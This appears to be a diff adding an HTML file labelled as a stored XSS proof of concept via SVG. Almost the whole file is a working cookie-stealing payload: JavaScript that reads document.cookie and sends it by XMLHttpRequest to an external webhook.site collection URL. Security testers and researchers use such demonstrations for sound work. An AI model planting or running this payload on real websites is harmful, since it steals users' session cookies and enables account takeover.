@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Example of stored XSS with SVG file </title>
+</head>
+<body>
+  <script type="text/javascript">
+    <![CDATA[
+      // JavaScript code embedded in the SVG
+      function getUserCookies() {
+  
+        // Read all cookies
+        var allCookies = document.cookie;
+        alert("Cookies found:" + allCookies)
+		
+		
+		// Create an XMLHttpRequest object
+		const xhttp = new XMLHttpRequest();
+
+		// Define a callback function
+		xhttp.onload = function() {
+		  // Here you can use the Data
+		}
+
+		// Send a request
+		xhttp.open("GET", "https://webhook.site/25e79811-9ef7-4523-bf4c-a965c429f250"+allCookies);
+		xhttp.send();
+
+		
+      }
+
+      // call the function
+      getUserCookies();
+    ]]>
+  </script>
+
+
+</body>
+</html>
